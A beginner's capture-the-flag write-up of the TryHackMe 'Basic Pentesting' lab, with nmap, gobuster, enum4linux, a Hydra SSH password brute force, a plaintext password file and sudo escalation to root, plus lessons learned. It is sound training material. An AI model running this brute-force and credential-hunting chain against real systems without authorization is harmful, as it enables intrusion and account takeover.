# 🚩 CTF Writeup — TryHackMe: Basic Pentesting

> Part of the [100 Days of Cybersecurity](../README.md) challenge — Day 020
> **Room:** Basic Pentesting | **Difficulty:** Easy | **Platform:** TryHackMe

---

## Overview

My first real CTF machine. This is an honest writeup — including what went wrong, what took too long, and what I'd do differently.

**Time taken:** 2.5 hours (expected: ~45 minutes)
**Skills used:** Nmap, Gobuster, enum4linux, Hydra, basic privilege escalation

---

## Methodology Used

Following the PTES methodology from Day 21:

```
1. Recon      → Nmap + web enumeration
2. Analysis   → Identify attack surface
3. Exploit    → SSH brute force
4. Post-Exp   → Find credentials, escalate to root
```

---

## Step 1 — Initial Nmap Scan

```bash
nmap -sV -sC -T4 <target-ip> -oN nmap_initial.txt
```

**Output:**
```
PORT     STATE SERVICE     VERSION
22/tcp   open  ssh         OpenSSH 7.2p2 Ubuntu 4ubuntu2.8
80/tcp   open  http        Apache httpd 2.4.18
139/tcp  open  netbios-ssn Samba smbd 3.X - 4.X
445/tcp  open  netbios-ssn Samba smbd 4.3.11-Ubuntu

Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

**Analysis:**
- OpenSSH 7.2p2 → check CVE-2016-6210 (user enumeration)
- Apache 2.4.18 → older, check for vulns
- Samba 4.3.11 → enumerate shares and users

---

## Step 2 — Web Enumeration

```bash
# Check what's on the web server
curl http://<target-ip>
# → Basic webpage, nothing obvious

# Directory brute force
gobuster dir \
  -u http://<target-ip> \
  -w /usr/share/wordlists/dirb/common.txt \
  -x php,html,txt \
  -t 50
```

**Output:**
```
/development (Status: 301)
/index.html  (Status: 200)
```

**Visiting /development:**

Found a text file with a note from developers:

```
J and K,

I've set up the dev environment. Remember to use your
usual credentials to SSH in. Don't use root.

- Admin
```

**Key finding:** Two users mentioned — `j` and `k` (likely `jan` and `kay`)

> ⚠️ **Mistake #1:** I spent 40 minutes trying to find Apache vulnerabilities before properly checking the web content. The answer was in /development the whole time.
>
> **Lesson:** Always fully enumerate web directories BEFORE moving to exploitation.

---

## Step 3 — SMB Enumeration

```bash
enum4linux -a <target-ip>
```

**Key output:**
```
[+] Got OS info for <target-ip> from smbclient:
    Domain=[WORKGROUP] OS=[Windows 6.1] Server=[Samba 4.3.11-Ubuntu]

[+] Enumerating users using SID S-1-22-1
S-1-22-1-1000 Unix User\kay (Local User)
S-1-22-1-1001 Unix User\jan (Local User)
```

**Confirmed users:** `jan` and `kay`

---

## Step 4 — SSH Brute Force

With two valid usernames, try brute forcing SSH.

```bash
# Try jan first
hydra -l jan \
  -P /usr/share/wordlists/rockyou.txt \
  ssh://<target-ip> \
  -t 4 \
  -V
```

**Output (after ~3 minutes):**
```
[22][ssh] host: <target-ip>  login: jan  password: armando
```

**Login:**
```bash
ssh jan@<target-ip>
# Welcome to Ubuntu 16.04.4 LTS
```

Got a shell as `jan`.

---

## Step 5 — Local Enumeration

```bash
# Who am I and what can I do?
whoami
# jan

id
# uid=1001(jan) gid=1001(jan) groups=1001(jan)

sudo -l
# Sorry, user jan may not run sudo on basicpentesting

# Check other users' home directories
ls -la /home/
# jan  kay

ls -la /home/kay/
# -rw-r--r-- 1 kay kay  pass.bak
#   ↳ Readable by jan!

cat /home/kay/pass.bak
# kayisawesome
```

> ⚠️ **Mistake #2:** I immediately ran linpeas looking for complex privesc paths. The answer was a plaintext backup file in another user's home directory — visible in the first `ls -la`.
>
> **Lesson:** Always check the obvious things first. Don't overcomplicate privilege escalation.

---

## Step 6 — Privilege Escalation

```bash
# Switch to kay with discovered password
su kay
# Password: kayisawesome

# Check kay's sudo privileges
sudo -l
# (ALL : ALL) ALL
# kay can run anything as root!

# Escalate to root
sudo su

# Confirm
whoami
# root
```

---

## Step 7 — Capture the Flag

```bash
cat /root/flag.txt
# flag{xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx}
```

**Machine rooted. Flag captured.**

---

## Full Attack Chain

```
Nmap → found SSH, HTTP, SMB
         ↓
Gobuster → found /development directory
         ↓
Developer note → hinted at usernames jan and kay
         ↓
enum4linux → confirmed usernames jan and kay
         ↓
Hydra → brute forced jan's SSH password (armando)
         ↓
SSH login as jan
         ↓
ls -la /home/kay/ → found readable pass.bak
         ↓
cat pass.bak → got kay's password (kayisawesome)
         ↓
su kay → sudo -l → (ALL:ALL) ALL
         ↓
sudo su → root
         ↓
cat /root/flag.txt → 🚩
```

---

## What I Got Wrong — Honest Reflection

| Mistake | Time Lost | Lesson |
|---------|-----------|--------|
| Chased Apache CVEs before fully enumerating web | ~40 min | Enumerate completely before exploiting |
| Forgot enum4linux for SMB, tried manual methods | ~15 min | Know your toolset. Use the right tool. |
| Ran linpeas before checking obvious files | ~10 min | Check home directories and obvious files first |

**Total wasted time: ~65 minutes on a machine that should take 45.**

---

## Key Takeaways

1. **Enumerate fully before exploiting anything.** The /development directory was the key — found in minute 5. I ignored it for 40 minutes.

2. **Privilege escalation isn't always technical.** A backup file with a plaintext password in another user's home directory is a completely valid finding — and more common in real pen tests than complex kernel exploits.

3. **The attack chain matters more than individual tools.** Nmap → Gobuster → enum4linux → Hydra → manual enumeration. Each step fed the next.

4. **Document as you go.** I almost lost track of the /development finding because I hadn't written it down.

---

## Tools Used

| Tool | Purpose |
|------|---------|
| nmap | Port scanning and service detection |
| gobuster | Web directory enumeration |
| enum4linux | SMB user and share enumeration |
| hydra | SSH password brute force |
| manual Linux commands | Post-exploitation enumeration |

---

*Part of my [100 Days of Cybersecurity](../README.md) challenge.*